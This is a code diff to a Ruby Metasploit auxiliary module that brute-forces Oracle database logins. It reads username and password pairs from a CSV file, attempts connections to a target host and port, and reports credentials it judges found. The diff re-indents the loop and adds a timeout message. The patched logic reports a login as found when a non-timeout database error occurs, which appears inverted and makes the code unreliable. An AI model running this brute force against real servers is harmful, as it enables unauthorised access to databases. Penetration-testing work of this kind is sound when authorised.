@@ -44,16 +44,17 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Starting brute force on #{datastore['RHOST']}:#{datastore['RPORT']}...")
 
     fd = CSV.foreach(list) do |brute|
+      datastore['DBUSER'] = brute[2].downcase
+      datastore['DBPASS'] = brute[3].downcase
 
-    datastore['DBUSER'] = brute[2].downcase
-    datastore['DBPASS'] = brute[3].downcase
-
-    begin
-      connect
-      disconnect
-    rescue ::OCIError => e
-      break if e.to_s =~ /^ORA-12170:\s/
-      unless e
+      begin
+        connect
+        disconnect
+      rescue ::OCIError => e
+        if e.to_s =~ /^ORA-12170:\s/
+          print_error("#{datastore['RHOST']}:#{datastore['RPORT']} Connection timed out")
+          break
+        else
           report_auth_info(
             :host  => "#{datastore['RHOST']}",
             :port  => "#{datastore['RPORT']}",
@@ -63,8 +64,8 @@ class Metasploit3 < Msf::Auxiliary
             :active => true
           )
           print_status("Found user/pass of: #{datastore['DBUSER']}/#{datastore['DBPASS']} on #{datastore['RHOST']} with sid #{datastore['SID']}")
+        end
       end
     end
-    end
   end
-end
+end #class
